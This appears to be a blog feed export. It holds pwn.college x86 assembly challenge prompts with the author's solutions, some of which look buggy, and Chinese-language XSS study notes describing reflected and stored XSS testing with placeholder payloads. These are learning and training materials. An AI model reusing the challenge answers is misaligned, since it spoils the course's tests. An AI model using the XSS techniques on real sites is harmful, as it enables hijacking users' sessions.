memory address of the last value pushed.<br>Similar to the memory levels we can use [rsp] to access the value at the memory address in rsp.</p><p>Without using pop please calculate the average of 4 consecutive quad words stored on the stack.<br>Store the average on the top of the stack. Hint:<br>RSP+0x?? Quad Word A<br>RSP+0x?? Quad Word B<br>RSP+0x?? Quad Word C<br>RSP      Quad Word D<br>RSP-0x?? Average</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x400000:mov   rax, 0<br>0x400007:add   rax, qword ptr [rsp]<br>0x40000b:add   rax, qword ptr [rsp + 8]<br>0x400010:add   rax, qword ptr [rsp + 0x10]<br>0x400015:add   rax, qword ptr [rsp + 0x18]<br>0x40001a:mov   rbx, 4<br>0x400021:div   rbx<br>0x400024:push  rax<br></code></pre></td></tr></table></figure><h2 id="Level-17"><a href="#Level-17" class="headerlink" title="Level 17"></a>Level 17</h2><p>In this level you will be working with control flow manipulation. This involves using instructions<br>to both indirectly and directly control the special register <code>rip</code>, the instruction pointer.<br>You will use instructions like: jmp, call, cmp, and the like to implement requests behavior.</p><p>Earlier, you learned how to manipulate data in a pseudo-control way, but x86 gives us actual<br>instructions to manipulate control flow directly. There are two major ways to manipulate control<br>flow: 1. through a jump; 2. through a call. In this level, you will work with jumps. There are two types of jumps:</p><ol><li>Unconditional jumps</li><li>Conditional jumps<br> Unconditional jumps always trigger and are not based on the results of earlier instructions.<br> As you know, memory locations can store data and instructions. You code will be stored at 0x40008c (this will change each run).<br> For all jumps, there are three types:</li><li>Relative jumps</li><li>Absolute jumps</li><li>Indirect jumps</li></ol><p>In this level we will ask you to do both a relative jump and an absolute jump. You will do a relative jump first, then an absolute one. You will need to fill space in your code with something to make this relative jump possible. We suggest using the <code>nop</code> instruction. It’s 1 byte and very predictable.<br>Useful instructions for this level is:<br>jmp (reg1 | addr | offset) ; nop<br>Hint: for the relative jump, lookup how to use <code>labels</code> in x86.</p><p>Using the above knowledge, perform the following:<br>Create a two jump trampoline: </p><ol><li>Make the first instruction in your code a jmp</li><li>Make that jmp a relative jump to 0x51 bytes from its current position</li><li>At 0x51 write the following code:</li><li>Place the top value on the stack into register rdi</li><li>jmp to the absolute address 0x403000</li></ol><blockquote><p><a href="https://www.developerastrid.com/assembly/assembly-language-program-transfer-instruction/">https://www.developerastrid.com/assembly/assembly-language-program-transfer-instruction/</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">_start:<br>    jmp short dest<br>    .rept 0x51<br>    nop<br>    .endr<br>dest:<br>    mov rdi, [rsp]<br>    mov r12, 0x403000<br>    jmp r12<br></code></pre></td></tr></table></figure><h2 id="Level-18"><a href="#Level-18" class="headerlink" title="Level 18"></a>Level 18</h2><p>We will be testing your code multiple times in this level with dynamic values! This means we will be running your code in a variety of random ways to verify that the logic is robust enough to survive normal use. You can consider this as normal dynamic value se<br>We will now introduce you to conditional jumps–one of the most valuable instructions in x86.<br>In higher level programming languages, an if-else structure exists to do things like:<br>if x is even:<br>   is_even &#x3D; 1<br>else:<br>   is_even &#x3D; 0<br>This should look familiar, since its implementable in only bit-logic. In these structures, we can control the programs control flow based on dynamic values provided to the program. Implementing the above logic with jmps can be done like so:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-comment">; assume rdi = x, rax is output</span><br><span class="hljs-comment">; rdx = rdi mod 2</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">2</span><br><span class="hljs-keyword">div</span> <span class="hljs-built_in">rsi</span><br><span class="hljs-comment">; remainder is 0 if even</span><br><span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span><br><span class="hljs-comment">; jump to not_even code is its not 0</span><br><span class="hljs-keyword">jne</span> not_even<br><span class="hljs-comment">; fall through to even code</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">jmp</span> done<br><span class="hljs-comment">; jump to this only when not_even</span><br><span class="hljs-symbol">not_even:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">done:</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">rbx</span><br><span class="hljs-comment">; more instructions here</span><br></code></pre></td></tr></table></figure><p>Often though, you want more than just a single ‘if-else’. Sometimes you want two if checks, followed by an else. To do this, you need to make sure that you have control flow that ‘falls-through’ to the next <code>if</code> after it fails. All must jump to the same <code>done</code> after execution to avoid the else.<br>There are many jump types in x86, it will help to learn how they can be used. Nearly all of them rely on something called the ZF, the Zero Flag. The ZF is set to 1 when a cmp is equal. 0 otherwise.</p><p>Using the above knowledge, implement the following:<br>if [x] is 0x7f454c46:<br>   y &#x3D; [x+4] + [x+8] + [x+12]</p><p>else if [x] is 0x00005A4D:<br>   y &#x3D; [x+4] - [x+8] - [x+12]<br>else:<br>   y &#x3D; [x+4] * [x+8] * [x+12]</p><p>where:<br>x &#x3D; rdi, y &#x3D; rax. Assume each dereferenced value is a signed dword. This means the values can start as a negative value at each memory position.<br>A valid solution will use the following at least once:<br>jmp (any variant), cmp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x400000:    cmp       dword ptr [rdi], 0x7f454c46<br>0x400006:    je        0x400012<br>0x400008:    cmp       dword ptr [rdi], 0x5a4d<br>0x40000e:    je        0x40001d<br>0x400010:    jmp       0x400028<br>0x400012:    mov       eax, dword ptr [rdi + 4]<br>0x400015:    add       eax, dword ptr [rdi + 8]<br>0x400018:    add       eax, dword ptr [rdi + 0xc]<br>0x40001b:    jmp       0x400033<br>0x40001d:    mov       eax, dword ptr [rdi + 4]<br>0x400020:    sub       eax, dword ptr [rdi + 8]<br>0x400023:    sub       eax, dword ptr [rdi + 0xc]<br>0x400026:    jmp       0x400033<br>0x400028:    mov       eax, dword ptr [rdi + 4]<br>0x40002b:    imul      eax, dword ptr [rdi + 8]<br>0x40002f:    imul      eax, dword ptr [rdi + 0xc]<br></code></pre></td></tr></table></figure><h2 id="Level-19"><a href="#Level-19" class="headerlink" title="Level 19"></a>Level 19</h2><p>We will be testing your code multiple times in this level with dynamic values! This means we will be running your code in a variety of random ways to verify that the logic is robust enough to survive normal use. You can consider this as normal dynamic value se</p><p>The last set of jump types is the indirect jump, which is often used for switch statements in the real world. Switch statements are a special case of if-statements that use only numbers to determine where the control flow will go. Here is an example:<br>switch(number):<br>    0: jmp do_thing_0<br>    1: jmp do_thing_1<br>    2: jmp do_thing_2<br>    default: jmp do_default_thing<br>The switch in this example is working on <code>number</code>, which can either be 0, 1, or 2. In the case that <code>number</code> is not one of those numbers, default triggers. You can consider this a reduced else-if type structure.<br>In x86, you are already used to using numbers, so it should be no suprise that you can make if statements based on something being an exact number. In addition, if you know the range of the numbers, a switch statement works very well. Take for instance the existence of a jump table. A jump table is a contiguous section of memory that holds addresses of places to jump. In the above example, the jump table could look like:<br>[0x1337] &#x3D; address of do_thing_0<br>[0x1337+0x8] &#x3D; address of do_thing_1<br>[0x1337+0x10] &#x3D; address of do_thing_2<br>[0x1337+0x18] &#x3D; address of do_default_thing<br>Using the jump table, we can greatly reduce the amount of cmps we use. Now all we need to check is if <code>number</code> is greater than 2. If it is, always do:<br>jmp [0x1337+0x18]<br>Otherwise:<br>jmp [jump_table_address + number * 8]<br>Using the above knowledge, implement the following logic:<br>if rdi is 0:<br>    jmp 0x403026<br>else if rdi is 1:<br>    jmp 0x403086<br>else if rdi is 2:<br>    jmp 0x4030d8<br>else if rdi is 3:<br>    jmp 0x4030f3<br>else:<br>    jmp 0x403133<br>Please do the above with the following constraints:</p><ul><li>assume rdi will NOT be negative</li><li>use no more than 1 cmp instruction</li><li>use no more than 3 jumps (of any variant)</li><li>we will provide you with the number to ‘switch’ on in rdi.</li><li>we will provide you with a jump table base address in rsi.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    CMP RDI, 4<br>    JL AAA<br>    MOV RDI, 4<br>AAA:<br>    mov rax, rdi<br>    mov rbx, 8<br>    mul rbx<br>    mov ebx, DWORD PTR [rax+rsi]<br>    jmp rbx<br></code></pre></td></tr></table></figure><h2 id="Level-20"><a href="#Level-20" class="headerlink" title="Level 20"></a>Level 20</h2><p>In  a previous level you computed the average of 4 integer quad words, which<br>was a fixed amount of things to compute, but how do you work with sizes you get when<br>the program is running? In most programming languages a structure exists called the<br>for-loop, which allows you to do a set of instructions for a bounded amount of times.<br>The bounded amount can be either known before or during the programs run, during meaning<br>the value is given to you dynamically. As an example, a for-loop can be used to compute<br>the sum of the numbers 1 to n:<br>sum &#x3D; 0<br>i &#x3D; 1<br>for i &lt;&#x3D; n:<br>    sum +&#x3D; i<br>    i +&#x3D; 1</p><p>Please compute the average of n consecutive quad words, where:<br>rdi &#x3D; memory address of the 1st quad word<br>rsi &#x3D; n (amount to loop for)<br>rax &#x3D; average computed</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x400000:    xor       rax, rax<br>0x400003:    xor       rbx, rbx<br>0x400006:    cmp       rbx, rsi<br>0x400009:    jge       0x400013<br>0x40000b:    add       eax, dword ptr [edi + ebx*4]<br>0x40000f:    inc       ebx<br>0x400011:    jmp       0x400006<br>0x400013:    cdq<br>0x400014:    idiv      esi<br>0x400016:    dec       rax<br></code></pre></td></tr></table></figure><h2 id="Level-21"><a href="#Level-21" class="headerlink" title="Level 21"></a>Level 21</h2><p>In previous levels you discovered the for-loop to iterate for a <em>number</em> of times, both dynamically and statically known, but what happens when you want to iterate until you meet a condition? A second loop structure exists called the while-loop to fill this demand. In the while-loop you iterate until a condition is met. As an example, say we had a location in memory with adjacent numbers and we wanted to get the average of all the numbers until we find one bigger or equal to 0xff:<br>average &#x3D; 0<br>i &#x3D; 0<br>while x[i] &lt; 0xff:<br>    average +&#x3D; x[i]<br>    i +&#x3D; 1<br>average &#x2F;&#x3D; i</p><p>Using the above knowledge, please perform the following:<br>Count the consecutive non-zero bytes in a contiguous region of memory, where:<br>rdi &#x3D; memory address of the 1st byte<br>rax &#x3D; number of consecutive non-zero bytes<br>Additionally, if rdi &#x3D; 0, then set rax &#x3D; 0 (we will check)!<br>An example test-case, let:<br>rdi &#x3D; 0x1000<br>[0x1000] &#x3D; 0x41<br>[0x1001] &#x3D; 0x42<br>[0x1002] &#x3D; 0x43<br>[0x1003] &#x3D; 0x00<br>then: rax &#x3D; 3 should be set</p><p>We will now run multiple tests on your code, here is an example run:</p><ul><li>(data) [0x404000] &#x3D; {10 random bytes},</li><li>rdi &#x3D; 0x404000</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x400000:    xor       rax, rax<br>0x400003:    xor       rdx, rdx<br>0x400006:    cmp       rdi, 0<br>0x40000a:    je        0x400017<br>0x40000c:    cmp       byte ptr [rdi + rax], 0<br>0x400010:    je        0x400017<br>0x400012:    inc       rax<br>0x400015:    jmp       0x40000c<br></code></pre></td></tr></table></figure><h2 id="Level-22"><a href="#Level-22" class="headerlink" title="Level 22"></a>Level 22</h2><p>In previous levels you implemented a while loop to count the number of consecutive non-zero bytes in a contiguous region of memory. In this level you will be provided with a contiguous region of memory again and will loop over each performing a conditional operation till a zero byte is reached.<br>All of which will be contained in a function!</p><p>A function is a callable segment of code that does not destory control flow.<br>Functions use the instructions “call” and “ret”.</p><p>The “call” instruction pushes the memory address of the next instruction onto<br>the stack and then jumps to the value stored in the first argument.</p><p>Let’s use the following instructions as an example:<br>0x1021 mov rax, 0x400000<br>0x1028 call rax<br>0x102a mov [rsi], rax</p><ol><li>call pushes 0x102a, the address of the next instruction, onto the stack.</li><li>call jumps to 0x400000, the value stored in rax.<br>The “ret” instruction is the opposite of “call”. ret pops the top value off of<br>the stack and jumps to it.<br>Let’s use the following instructions and stack as an example:<br>                     Stack ADDR  VALUE</li></ol><p>0x103f mov rax, rdx         RSP + 0x8   0xdeadbeef<br>0x1042 ret                  RSP + 0x0   0x0000102a<br>ret will jump to 0x102a<br>Please implement the following logic:<br>str_lower(src_addr):<br>    rax &#x3D; 0<br>    if src_addr !&#x3D; 0:<br>        while [src_addr] !&#x3D; 0x0:<br>            if [src_addr] &lt;&#x3D; 90:<br>                [src_addr] &#x3D; foo([src_addr])<br>                rax +&#x3D; 1<br>            src_addr +&#x3D; 1<br>foo is provided at 0x403000. foo takes a single argument as a value</p><p>We will now run multiple tests on your code, here is an example run:</p><ul><li>(data) [0x404000] &#x3D; {10 random bytes},</li><li>rdi &#x3D; 0x404000</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x400000:    xor       rax, rax<br>0x400003:    mov       rdx, rdi<br>0x400006:    mov       r13, 0x403000<br>0x40000d:    cmp       rdx, 0<br>0x400011:    je        0x400038<br>0x400013:    cmp       byte ptr [rdx], 0<br>0x400016:    je        0x400038<br>0x400018:    cmp       byte ptr [rdx], 0x5a<br>0x40001b:    jle       0x400022<br>0x40001d:    inc       rdx<br>0x400020:    jmp       0x400013<br>0x400022:    mov       dil, byte ptr [rdx]<br>0x400025:    mov       r12, rax<br>0x400028:    call      r13<br>0x40002b:    mov       byte ptr [rdx], al<br>0x40002d:    mov       rax, r12<br>0x400030:    inc       rax<br>0x400033:    inc       rdx<br>0x400036:    jmp       0x400013<br>0x400038:    nop<br>0x400039:    ret<br></code></pre></td></tr></table></figure><h2 id="Level-23"><a href="#Level-23" class="headerlink" title="Level 23"></a>Level 23</h2><p>In the previous level, you learned how to make your first function and how to call other functions. Now we will work with functions that have a function stack frame. A function stack frame is a set of pointers and values pushed onto the stack to save things for later use and allocate space on the stack for function variables.<br>First, let’s talk about the special register rbp, the Stack Base Pointer. The rbp register is used to tell where our stack frame first started. As an example, say we want to construct some list (a contiguous space of memory) that is only used in our function. The list is 5 elements long, each element is a dword.<br>A list of 5 elements would already take 5 registers, so instead, we can make pace on the stack! The assembly would look like:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; setup the base of the stack as the current top<br>mov rbp, rsp<br>; move the stack 0x14 bytes (5 * 4) down<br>; acts as an allocation<br>sub rsp, 0x14<br>; assign list[2] = 1337<br>mov eax, 1337<br>mov [rbp-0x8], eax<br>; do more operations on the list ...<br>; restore the allocated space<br>mov rsp, rbp<br>ret<br></code></pre></td></tr></table></figure><p>Notice how rbp is always used to restore the stack to where it originally was. If we don’t restore the stack after use, we will eventually run out TM. In addition, notice how we subtracted from rsp since the stack grows down. To make it have more space, we subtract the space we need. The ret and call still works the same. It is assumed that you will never pass a stack address across functions, since, as you can see from the above use, the stack can be overwritten by anyone at any time.<br>Once, again, please make function(s) that implements the following:<br>most_common_byte(src_addr, size):<br>    b &#x3D; 0<br>    i &#x3D; 0<br>    for i &lt;&#x3D; size-1:<br>        curr_byte &#x3D; [src_addr + i]<br>        [stack_base - curr_byte] +&#x3D; 1<br>    b &#x3D; 0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">max_freq = 0<br>max_freq_byte = 0<br>for b &lt;= 0xff:<br>    if [stack_base - b] &gt; max_freq:<br>        max_freq = [stack_base - b]<br>        max_freq_byte = b<br><br>return max_freq_byte<br></code></pre></td></tr></table></figure><p>Assumptions:</p><ul><li>There will never be more than 0xffff of any byte</li><li>The size will never be longer than 0xffff</li><li>The list will have at least one element</li></ul><p>Constraints:</p><ul><li>You must put the “counting list” on the stack</li><li>You must restore the stack like in a normal function</li><li>You cannot modify the data at src_addr</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x400000:    push      rbp<br>0x400001:    mov       rbp, rsp<br>0x400004:    sub       rsp, 0xffff<br>0x40000b:    mov       rbx, -1<br>0x400012:    add       rbx, 1<br>0x400016:    cmp       rbx, rsi<br>0x400019:    je        0x400024<br>0x40001b:    mov       cl, byte ptr [rdi + rbx]<br>0x40001e:    add       byte ptr [rsp + rcx], 1<br>0x400022:    jmp       0x400012<br>0x400024:    mov       rbx, -1<br>0x40002b:    xor       rcx, rcx<br>0x40002e:    xor       rdx, rdx<br>0x400031:    add       rbx, 1<br>0x400035:    cmp       rbx, 0xffff<br>0x40003c:    je        0x40004b<br>0x40003e:    cmp       byte ptr [rsp + rbx], cl<br>0x400041:    jle       0x400031<br>0x400043:    mov       cl, byte ptr [rsp + rbx]<br>0x400046:    mov       rdx, rbx<br>0x400049:    jmp       0x400031<br>0x40004b:    mov       rax, rdx<br>0x40004e:    mov       rsp, rbp<br>0x400051:    pop       rbp<br>0x400052:    ret<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>pwn.college</tag>
      
      <tag>Assembly</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS Attacks</title>
    <link href="/2022/02/21/2022-2-21-XSS-Attacks/"/>
    <url>/2022/02/21/2022-2-21-XSS-Attacks/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文是我的XSS学习笔记</p><p><a href="https://portswigger.net/web-security/cross-site-scripting">https://portswigger.net/web-security/cross-site-scripting</a></p></blockquote><h2 id="什么是跨站脚本（Cross-site-Scripting-XSS"><a href="#什么是跨站脚本（Cross-site-Scripting-XSS" class="headerlink" title="什么是跨站脚本（Cross-site Scripting XSS)"></a>什么是跨站脚本（Cross-site Scripting XSS)</h2><p>Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have  with a vulnerable application. It allows an attacker to circumvent the  same origin policy, which is designed to segregate different websites  from each other. Cross-site scripting vulnerabilities normally allow an  attacker to masquerade as a victim user, to carry out any actions that  the user is able to perform, and to access any of the user’s data. If  the victim user has privileged access within the application, then the  attacker might be able to gain full control over all of the  application’s functionality and data.        </p><p>XSS是一种允许攻击者绕过同源策略，在渲染过程中发生了不在预期过程中的JavaScript代码执行。XSS通常被用于假扮受害者用户，从而进行只有用户才能进行的操作或获取用户数据如Cookie，如果此用户拥有高权限，攻击者甚至可能据此获得Web应用的全局控制权。</p><h2 id="XSS的工作原理是什么"><a href="#XSS的工作原理是什么" class="headerlink" title="XSS的工作原理是什么"></a>XSS的工作原理是什么</h2><p>XSS通过操控存在相关漏洞的网页使其将可以Javascript代码返回给受害者，当此代码在受害者的浏览器中运行时，攻击者就可以完全掌控受害者于应用的交互。</p><p><img src="https://portswigger.net/web-security/images/cross-site-scripting.svg" alt="XSS原理"></p><h2 id="XSS验证"><a href="#XSS验证" class="headerlink" title="XSS验证"></a>XSS验证</h2><p>可以通过注入一个有效载荷，使自己的浏览器执行一些任意的JavaScript来确认大多数类型的XSS漏洞。长期以来，使用alert()函数是一种常见的做法，因为它很短，无害，而且当它被成功调用时很明显。事实上，你可以通过在模拟受害者的浏览器中调用alert()来解决我们大多数的XSS实验。</p><p>然而，如果你使用Chrome浏览器，会有一个小麻烦。从92版开始（2021年7月20日），跨源iframe被阻止调用alert()。由于这些被用来构建一些更高级的XSS攻击，你有时需要使用一个替代的PoC有效载荷。在这种情况下，我们推荐使用print()函数。如果你有兴趣了解更多关于这一变化以及为什么我们喜欢print()，请查看我们关于这一主题的<a href="https://portswigger.net/research/alert-is-dead-long-live-print">博文</a>。</p><h2 id="反射型XSS-Reflected-XSS"><a href="#反射型XSS-Reflected-XSS" class="headerlink" title="反射型XSS (Reflected XSS)"></a>反射型XSS (Reflected XSS)</h2><p>反射型XSS是最简单的一种，其过程为当Web应用收到一个HTTP请求的数据时，以不安全的方式处理这些数据。反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor、NoScript等防御手段的影响较大。一个简单的例子：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">https://insecure-website.com/status?message=<span class="hljs-keyword">All</span>+<span class="hljs-keyword">is</span>+well.<br>&lt;p&gt;Status: <span class="hljs-keyword">All</span> <span class="hljs-keyword">is</span> well.&lt;/p&gt;<br></code></pre></td></tr></table></figure><p>由于Web应用不对message的内容进行处理，而是直接显示，所以就可以构造以下攻击：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">https://insecure-website.com/status?message=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-comment">/*+Bad+stuff+here...+*/</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Status: <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-comment">/* Bad stuff here... */</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p><a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded">Lab: Reflected XSS into HTML context with nothing encoded</a></p></blockquote><p>第一个Lab很简单，只要在搜索域将搜索关键词换成脚本即可。</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzlw9x3f1uj20tg0goq3h.jpg" alt="image-20220221223746391"></p><h3 id="反射型XSS的影响"><a href="#反射型XSS的影响" class="headerlink" title="反射型XSS的影响"></a>反射型XSS的影响</h3><p>如果攻击者可以在受害者的浏览器上运行脚本，则说明攻击者可以完全掌控受害者的一切信息，包括：</p><ul><li>在Web应用内以受害者的身份进行操作。</li><li>浏览所有受害者可以浏览的信息。</li><li>修改所有受害者可以修改的信息。</li><li>以受害者的身份于其他应用进行交互。</li></ul><p>由于反射型XSS需要外部提交机制（需要受害者点击恶意链接），所以其影响相较于储存型XSS较小。</p><h3 id="反射型XSS的上下文"><a href="#反射型XSS的上下文" class="headerlink" title="反射型XSS的上下文"></a>反射型XSS的上下文</h3><p>现实中由于反射数据位置的不同，payload的种类和影响也会不同。同时网站在反射之前对提交数据的处理也会影响payload的选择。</p><h3 id="如何寻找并测试反射型XSS漏洞"><a href="#如何寻找并测试反射型XSS漏洞" class="headerlink" title="如何寻找并测试反射型XSS漏洞"></a>如何寻找并测试反射型XSS漏洞</h3><ul><li><strong>测试所有接入点</strong>： 包括参数，URL请求和消息体的数据，URL文件目录，HTTP头（有些头不能实施XSS）</li><li><strong>提交随机字母数字组合值：</strong>对每一个接入点都提交一个不同的随机值并判断是否反射，此值应该尽量绕过尽可能多的检查，所以一般尽量短且只含有数字和字母的组合，同时又需要足够长使得意外匹配的可能性足够低，因此8个字符左右通常比较合适。</li><li><strong>确定反射上下文：</strong>例如在HTTP tags之间，在tag的属性中，在JS字符串中等等。</li><li><strong>测试候选payload：</strong>根据反射的上下文，对候选payload进行测试，如果反射没有改变payload则可以使用如Burp Repeater等工具测试不同payload下的回应。</li><li><strong>测试其他payload：</strong>如果反射改变了payload，则需要使用其他payload或方法进行测试。详情见这里<a href="https://portswigger.net/web-security/cross-site-scripting/contexts">cross-site scripting contexts</a></li><li><strong>在浏览器中进行攻击测试：</strong>最后，当我们成功找到有效的payload后，在真实的浏览器环境中对其进行测试来确定JS代码是否真正执行。通常最简单的测试方法为<code>alert(document.domain)</code>。</li></ul><h3 id="反射型XSS的常见问题"><a href="#反射型XSS的常见问题" class="headerlink" title="反射型XSS的常见问题"></a>反射型XSS的常见问题</h3><ol><li>于储存型XSS的区别：当应用程序从HTTP请求中获取一些输入并以不安全的方式将该输入嵌入到即时响应中时，就会产生反射式XSS。对于存储的XSS，应用程序存储输入并以不安全的方式将其嵌入到以后的响应中。</li><li>于Self-XSS的区别：Self-XSS涉及的应用行为与常规反映的XSS类似，但它不能通过精心设计的URL或跨域请求以正常方式触发。相反，只有当受害者自己从他们的浏览器中提交XSS有效载荷时才会触发该漏洞。提供自我XSS攻击通常涉及社会工程，让受害者在他们的浏览器中粘贴一些攻击者提供的输入。因此，它通常被认为是一个蹩脚的、低影响的问题。</li></ol><h2 id="存储型XSS（Stored-cross-site-scripting"><a href="#存储型XSS（Stored-cross-site-scripting" class="headerlink" title="存储型XSS（Stored cross-site scripting)"></a>存储型XSS（Stored cross-site scripting)</h2><p>存储型XSS，又称永久XSS，意思是web应用从不信任的来源获取数据后以不安全的方式将其包含在应用之后的HTTP应答中。这样的数据可能来自用户的提交（如评论，用户昵称）等，这里是一个简单的存储型XSS漏洞，直接在网页上显示用户提交的数据。</p><p><code>&lt;p&gt;Hello, this is my message!&lt;/p&gt;</code></p><p>此时，我们可以通过</p>]]></content>
    
    
    
    <tags>
      
      <tag>Security learning</tag>
      
      <tag>XSS</tag>
      
      <tag>Client security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Leetcode链表专题</title>
    <link href="/2022/02/18/2022-2-18-Leetcode%E9%93%BE%E8%A1%A8%E4%B8%93%E9%A2%98/"/>
    <url>/2022/02/18/2022-2-18-Leetcode%E9%93%BE%E8%A1%A8%E4%B8%93%E9%A2%98/</url>
    
